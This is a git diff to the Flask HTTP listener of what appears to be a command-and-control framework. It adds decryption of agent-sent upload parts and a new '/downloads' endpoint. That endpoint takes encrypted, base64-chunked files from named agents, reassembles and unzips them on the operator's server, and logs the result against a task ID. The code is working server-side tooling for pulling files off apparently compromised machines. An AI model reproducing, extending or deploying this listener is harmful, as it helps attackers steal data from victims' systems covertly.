@@ -1,15 +1,17 @@
 import sys
+import zipfile
 import threading
-
 from io import BytesIO
-from core.logger import *
-from core.crypto import *
 from random import choice
-from base64 import b64encode
+from datetime import datetime
 from string import ascii_letters
 from multiprocessing import Process
-from os import path, getcwd
+from os import path, getcwd, remove
+from base64 import b64encode,b64decode
 from flask import Flask, render_template, request, send_from_directory
+
+from core.logger import *
+from core.crypto import *
 
 class HTTP_listener:
 
@@ -26,6 +28,9 @@ class HTTP_listener:
         self.certPath = path.join(getcwd(), 'certs', 'cert.pem')
         self.privkeyPath = path.join(getcwd(), 'certs', 'key.pem')
 
+        self.u_files = {}
+        self.d_files = {}
+
         key = self.stash.get_key(name)
         if key:
             self.key = key[0][0]
@@ -37,6 +42,13 @@ class HTTP_listener:
         self.app = Flask(__name__, template_folder=html_fold)
 
         self.running = True
+
+        if self.debug:
+            @self.app.before_request
+            def log_request_info():
+                # self.app.logger.debug('Headers: %s', request.headers)
+                if request.get_data():
+                    self.app.logger.debug(f'Body: {request.get_data()}')
 
         @self.app.route('/', methods=['GET'])
         def index():
@@ -106,12 +118,15 @@ class HTTP_listener:
 
         # user command input will put the file here with user choosen name
         @self.app.route('/upload/<file>', methods=['POST'])
-        def download(file):
-            # print(path.join(self.filePath, file))
+        def upload(file):
             file_to_split = path.join(self.uploadPath, file)
-            part = request.form.get('part')
+            
             name = request.form.get('name')
+            enc_part = request.form.get('part')
+            
             key = self.stash.get_agent_key(agent=name)
+            part = DECRYPT(enc_part, key).replace('VALID ','')
+            
             ## optimise this bloody waste of resources
             if path.isfile(file_to_split):
                 # return (send_from_directory(self.uploadPath, file, as_attachment=True), 200)
@@ -131,6 +146,58 @@ class HTTP_listener:
 
             else:
                 return (render_template(f'404.html', title = '404'), 404)
+
+        @self.app.route('/downloads/<file>', methods=['POST'])
+        def download(file):
+            # info = "$init"
+            # name = "$name"
+            # chunk = "$enc_len"
+            name = request.form.get('name')
+            enc_info = request.form.get('info')
+            enc_chunk = request.form.get('chunk')
+            
+            key = self.stash.get_agent_key(agent=name)
+            info = DECRYPT(enc_info,key).replace('VALID ','')
+            chunk = DECRYPT(enc_chunk,key).replace('VALID ','')
+            part,f_hash = info.split()
+
+            if part == 'init':
+                file_fpath = path.join(self.downloadPath,f'{datetime.now().strftime("%d%m%y-%H%M%S.%s")}_{file}.zip')
+                uid = ''.join(choice(ascii_letters) for i in range(20))
+                
+                while (path.isfile(file_fpath)):
+                    # what are the odds right?? xD
+                    file_fpath = path.join(self.downloadPath,f'{datetime.now().strftime("%d%m%y-%H%M%S.%s")}_{file}.zip')
+
+                ## create file unique ID, check if it exists already, encrypt it and send it
+                while self.stash.get_fileinfo(uid):
+                    uid = ''.join(choice(ascii_letters) for i in range(20))
+
+                open(file_fpath,'w+').close()
+                self.stash.set_file(uid, name, f_hash, file, file_fpath, 'download', chunk)
+
+                uid_enc = ENCRYPT(f'VALID {uid}',key)
+                return (uid_enc, 200)
+            else:
+                enc_fid = request.form.get('fid')
+                f_id = DECRYPT(enc_fid,key).replace('VALID ','')
+                full_path,leng = self.stash.get_fileinfo(f_id, name, f_hash)
+
+                with open(full_path,'ab') as fwb:
+                    fwb.write(b64decode(chunk))
+
+                if int(leng)-1 == int(part):
+                    with zipfile.ZipFile(full_path,'r') as zf:
+                            # zip_ref.extractall('/'.join(full_path.split('/')[:-1]))
+                            with open(full_path.replace('.zip',''),'wb') as fwb:
+                                fwb.write( zf.read(zf.namelist()[0]) )
+                    result = f'File downloaded to {full_path.replace(".zip","")}'
+                    enc_taskid = request.form.get('taskid')
+                    taskid = DECRYPT(enc_taskid,key).replace('VALID ','')
+                    self.stash.sql_stash( 'UPDATE commands_history SET output = ? WHERE command_code = ? ; ', (result, taskid) )
+                    remove(full_path)
+
+                return ('', 204)
 
         @self.app.errorhandler(404)
         def page_not_found(error):
